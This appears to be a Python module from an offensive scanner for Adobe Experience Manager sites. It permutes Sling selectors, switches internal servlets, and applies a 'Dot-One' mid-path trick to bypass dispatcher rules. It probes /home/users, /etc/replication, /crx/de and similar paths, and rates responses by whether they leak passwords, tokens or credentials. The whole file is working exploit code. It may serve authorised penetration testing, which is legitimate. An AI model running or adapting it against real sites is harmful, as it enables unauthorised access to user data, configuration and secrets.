"""Sling Smuggler — Advanced Path & Selector Permutation Engine.

Generates recursive permutations of AEM paths with:
- Selector chaining (.1.json, .tidy.json, .sysview.xml, .docview.xml, .pckg.zip)
- Internal servlet switching (.feed.xml, .search.json, .ext.json, .query.json)
- The "Dot-One" trick: insert .1. mid-path to bypass end-of-path dispatcher rules
- Deduplication and capped output per path
"""

import asyncio
import json
from typing import List, Dict, Set, Optional, Tuple
from itertools import product

from core.models import Finding, VulnSeverity, ScanPhase
from core.config import AEMConfig
from core.engine import HTTPXEngine
from bypass.transformers import BypassTransformer


class SlingSmuggler:
    """Advanced Sling path & selector permutation engine."""
    
    # Deep selectors for content extraction
    CONTENT_SELECTORS: List[str] = [
        ".1.json", ".2.json", ".3.json", ".5.json", ".10.json",
        ".-1.json", ".infinity.json",
        ".tidy.json", ".tidy.1.json", ".tidy.2.json", ".tidy.-1.json",
        ".sysview.xml", ".docview.xml",
        ".pckg.zip",
        ".res.tidy.json",
    ]
    
    # Internal servlet switching selectors
    SERVLET_SELECTORS: List[str] = [
        ".feed.xml",
        ".feed.json",
        ".search.json",
        ".ext.json",
        ".query.json",
        ".userinfo.json",
        ".permissions.json",
        ".pages.json",
        ".assets.json",
        ".tags.json",
        ".model.json",
        ".children.json",
        ".hierarchical.json",
        ".statistics.json",
        ".related.json",
        ".listorder.json",
        ".img.png",
        ".thumb.png",
        ".renditions.json",
    ]
    
    # "Dot-One" trick patterns — insert mid-path selectors
    DOT_ONE_PATTERNS: List[str] = [
        ".1.", ".children.", ".tidy.", ".infinity.",
        ".harray.", ".model.", ".res.", ".s7dam.",
    ]
    
    # Key paths to test permutations on
    TARGET_PATHS: List[str] = [
        "/content", "/content/dam", "/etc", "/etc/cloudservices",
        "/etc/replication", "/etc/workflow", "/home/users",
        "/home/groups", "/var/audit", "/var/replication",
        "/libs/granite", "/libs/cq", "/apps",
        "/bin/querybuilder.json", "/bin/wcm",
        "/system/console", "/crx/de",
    ]
    
    def __init__(self, engine: HTTPXEngine, config: AEMConfig, bypass: BypassTransformer):
        self.engine = engine
        self.config = config
        self.bypass = bypass
        self._seen_urls: Set[str] = set()
        self._max_per_path = 15  # Reduced from 25
        self._max_total_requests = 200  # Hard cap per phase
        self._request_count = 0
        # Semaphore to limit concurrent requests within this module
        self._semaphore = asyncio.Semaphore(min(20, config.max_concurrent))
        # Track consecutive failures for early exit
        self._consecutive_failures = 0
        self._max_consecutive_failures = 30  # Abort path if 30 consecutive 403/404/0
    
    async def run(self, base_url: str) -> List[Finding]:
        """Run the full Sling Smuggler permutation engine with timeouts."""
        findings: List[Finding] = []
        
        try:
            # Phase A: Content selector permutations (with 5 min timeout)
            selector_findings = await asyncio.wait_for(
                self._test_content_selectors(base_url),
                timeout=300  # 5 minutes max
            )
            findings.extend(selector_findings)
            
            # Phase B: Internal servlet switching (with 3 min timeout)
            servlet_findings = await asyncio.wait_for(
                self._test_servlet_selectors(base_url),
                timeout=180
            )
            findings.extend(servlet_findings)
            
            # Phase C: Dot-One trick (with 2 min timeout)
            dot_one_findings = await asyncio.wait_for(
                self._test_dot_one_trick(base_url),
                timeout=120
            )
            findings.extend(dot_one_findings)
            
            # Phase D: Recursive chaining (with 3 min timeout)
            chain_findings = await asyncio.wait_for(
                self._recursive_selector_chain(base_url),
                timeout=180
            )
            findings.extend(chain_findings)
            
        except asyncio.TimeoutError:
            print(f"[Sling Smuggler] Timeout reached — returning {len(findings)} findings")
        
        return findings
    
    async def _test_content_selectors(self, base_url: str) -> List[Finding]:
        """Test content extraction selectors on target paths with early exit."""
        findings = []
        self._request_count = 0
        self._consecutive_failures = 0
        
        for path in self.TARGET_PATHS:
            # Early exit if we're hitting walls
            if self._consecutive_failures >= self._max_consecutive_failures:
                print(f"[Sling Smuggler] Too many consecutive failures, skipping remaining paths")
                break
            if self._request_count >= self._max_total_requests:
                print(f"[Sling Smuggler] Request cap reached ({self._max_total_requests})")
                break
            
            path_findings = await self._test_single_path_selectors(base_url, path)
            findings.extend(path_findings)
        
        return findings
    
    async def _test_single_path_selectors(self, base_url: str, path: str) -> List[Finding]:
        """Test selectors on a single path with per-path semaphore."""
        findings = []
        tested = 0
        
        async with self._semaphore:
            for selector in self.CONTENT_SELECTORS:
                if tested >= self._max_per_path:
                    break
                if self._request_count >= self._max_total_requests:
                    break
                
                url = f"{base_url}{path}{selector}"
                if url in self._seen_urls:
                    continue
                self._seen_urls.add(url)
                tested += 1
                self._request_count += 1
                
                # Use reduced bypass attempts (5 instead of 10)
                response = await self.engine.get_with_bypass_fallback(
                    url, base_url, f"{path}{selector}",
                    bypass_transformer=self.bypass,
                    max_bypass_attempts=5
                )
                
                # Track failures for early exit
                if response.status_code in [401, 403, 404, 0]:
                    self._consecutive_failures += 1
                else:
                    self._consecutive_failures = 0  # Reset on success
                
                if response.status_code == 200 and self._is_meaningful(response.text):
                    severity = self._assess_severity(path, selector, response.text)
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="Sling Smuggler: Content Selector",
                        url=response.url or url,
                        severity=severity,
                        title=f"Content Leak via {selector}: {path}",
                        description=f"Selector {selector} exposes content at {path}",
                        evidence={
                            "selector": selector,
                            "path": path,
                            "response_size": len(response.text),
                            "sample": response.text[:500],
                            "bypass_used": getattr(response, 'bypass_used', None),
                        },
                        bypass_used=None,
                        chainable=True
                    ))
        
        return findings
    
    async def _test_servlet_selectors(self, base_url: str) -> List[Finding]:
        """Test internal servlet switching selectors with limits."""
        findings = []
        self._request_count = 0
        
        for path in self.TARGET_PATHS[:8]:  # Limit to first 8 paths
            if self._request_count >= self._max_total_requests // 2:
                break
            
            async with self._semaphore:
                tested = 0
                for selector in self.SERVLET_SELECTORS[:10]:  # Limit selectors
                    if tested >= 10 or self._request_count >= self._max_total_requests // 2:
                        break
                    
                    url = f"{base_url}{path}{selector}"
                    if url in self._seen_urls:
                        continue
                    self._seen_urls.add(url)
                    tested += 1
                    self._request_count += 1
                    
                    response = await self.engine.get_with_bypass_fallback(
                        url, base_url, f"{path}{selector}",
                        bypass_transformer=self.bypass,
                        max_bypass_attempts=3  # Reduced from 10
                    )
                    
                    if response.status_code == 200 and self._is_meaningful(response.text):
                        findings.append(Finding(
                            phase=ScanPhase.DISCOVERY,
                            technique="Sling Smuggler: Servlet Selector",
                            url=response.url or url,
                            severity=VulnSeverity.MEDIUM,
                            title=f"Internal Servlet via {selector}: {path}",
                            description=f"Servlet selector {selector} activates at {path}",
                            evidence={
                                "selector": selector,
                                "path": path,
                                "response_size": len(response.text),
                                "sample": response.text[:500],
                                "bypass_used": getattr(response, 'bypass_used', None),
                            },
                            chainable=True
                        ))
        
        return findings
    
    async def _test_dot_one_trick(self, base_url: str) -> List[Finding]:
        """Test the 'Dot-One' trick — insert selectors between path segments.
        
        E.g. /content.1.json/dam -> bypasses rules matching /content/dam
        """
        findings = []
        
        multi_segment_paths = [p for p in self.TARGET_PATHS if p.count("/") >= 2]
        
        for path in multi_segment_paths:
            parts = path.strip("/").split("/")
            
            for insert_pos in range(1, len(parts)):
                tested = 0
                for pattern in self.DOT_ONE_PATTERNS:
                    if tested >= 4:
                        break
                    
                    # Insert selector between segments
                    prefix = "/" + "/".join(parts[:insert_pos])
                    suffix = "/".join(parts[insert_pos:])
                    smuggled_url = f"{prefix}{pattern}json/{suffix}"
                    
                    full_url = f"{base_url}{smuggled_url}"
                    if full_url in self._seen_urls:
                        continue
                    self._seen_urls.add(full_url)
                    tested += 1
                    
                    response = await self.engine.get(full_url)
                    
                    if response.status_code == 200 and self._is_meaningful(response.text):
                        findings.append(Finding(
                            phase=ScanPhase.EXPLOITATION,
                            technique="Sling Smuggler: Dot-One Trick",
                            url=full_url,
                            severity=VulnSeverity.HIGH,
                            title=f"Dot-One Bypass: {path}",
                            description=(
                                f"Inserting {pattern} between path segments bypasses "
                                f"dispatcher rule for {path}"
                            ),
                            evidence={
                                "original_path": path,
                                "smuggled_url": smuggled_url,
                                "pattern": pattern,
                                "response_size": len(response.text),
                                "sample": response.text[:500],
                            },
                            chainable=True
                        ))
        
        return findings
    
    async def _recursive_selector_chain(self, base_url: str) -> List[Finding]:
        """Recursively chain selectors with strict limits."""
        findings = []
        visited: Set[str] = set()
        queue: List[Tuple[str, int]] = [(p, 0) for p in self.TARGET_PATHS[:6]]  # Reduced from 8
        max_queue_size = 50  # Prevent unbounded growth
        requests_this_phase = 0
        max_requests = 50  # Hard limit for this phase
        
        while queue and requests_this_phase < max_requests:
            path, depth = queue.pop(0)
            
            if depth > 1 or path in visited:  # Reduced depth from 2 to 1
                continue
            visited.add(path)
            
            url = f"{base_url}{path}.1.json"
            if url in self._seen_urls:
                continue
            self._seen_urls.add(url)
            requests_this_phase += 1
            
            async with self._semaphore:
                response = await self.engine.get(url)
            
            if response.status_code == 200:
                try:
                    data = json.loads(response.text)
                    if isinstance(data, dict):
                        children = [
                            k for k in data.keys()
                            if not k.startswith("jcr:") and ":" not in k
                            and isinstance(data.get(k), dict)
                        ]
                        
                        # Limit queue size
                        for child in children[:5]:  # Reduced from 10
                            child_path = f"{path}/{child}"
                            if child_path not in visited and len(queue) < max_queue_size:
                                queue.append((child_path, depth + 1))
                        
                        if children and depth > 0:
                            findings.append(Finding(
                                phase=ScanPhase.DISCOVERY,
                                technique="Sling Smuggler: Recursive Chain",
                                url=url,
                                severity=VulnSeverity.LOW,
                                title=f"Deep Child Discovery: {path}",
                                description=f"Found {len(children)} children at depth {depth}",
                                evidence={
                                    "path": path,
                                    "depth": depth,
                                    "children": children[:10],  # Reduced from 20
                                    "child_count": len(children),
                                },
                                chainable=True
                            ))
                except (json.JSONDecodeError, KeyError):
                    pass
        
        return findings
    
    def _is_meaningful(self, text: str) -> bool:
        """Check if the response contains meaningful AEM/JCR data (not empty)."""
        if len(text) < 10:
            return False
        
        # Check for empty JSON arrays/objects which are false positives
        stripped = text.strip()
        if stripped in ['[]', '{}', '{"hits":[],"results":0}', '{"pages":[],"results":0}', 
                        '{"tags":[],"results":0}', '{"assets":[],"results":0}']:
            return False
        
        # Try to parse JSON and check if it has actual content
        try:
            data = json.loads(stripped)
            if isinstance(data, dict):
                # Check if any array has actual items
                has_content = False
                for key, value in data.items():
                    if isinstance(value, list) and len(value) > 0:
                        has_content = True
                        break
                    if isinstance(value, (dict, str, int)) and value:
                        has_content = True
                        break
                if not has_content:
                    return False
            elif isinstance(data, list) and len(data) == 0:
                return False
        except json.JSONDecodeError:
            pass  # Not JSON, continue with text checks
        
        indicators = [
            "jcr:primaryType", "sling:resourceType", "cq:", "nt:",
            "rep:", "items", "properties", "children", "<feed",
            "<entry", "totalMatches", "hits", "nodes"
        ]
        return any(ind in text for ind in indicators)
    
    def _assess_severity(self, path: str, selector: str, text: str) -> VulnSeverity:
        """Assess severity based on path, selector, and response content."""
        # Critical: sensitive paths with deep selectors
        sensitive_paths = ["/etc/replication", "/home/users", "/var/audit", "/etc/cloudservices"]
        deep_selectors = [".infinity.json", ".-1.json", ".sysview.xml", ".docview.xml"]
        
        if any(sp in path for sp in sensitive_paths):
            if any(ds in selector for ds in deep_selectors):
                return VulnSeverity.CRITICAL
            return VulnSeverity.HIGH
        
        # High: password or secret data in response
        secret_indicators = ["password", "secret", "apikey", "api_key", "token", "credential"]
        text_lower = text[:2000].lower()
        if any(si in text_lower for si in secret_indicators):
            return VulnSeverity.HIGH
        
        # Medium: any non-trivial JSON/XML data
        if selector in deep_selectors:
            return VulnSeverity.MEDIUM
        
        return VulnSeverity.LOW
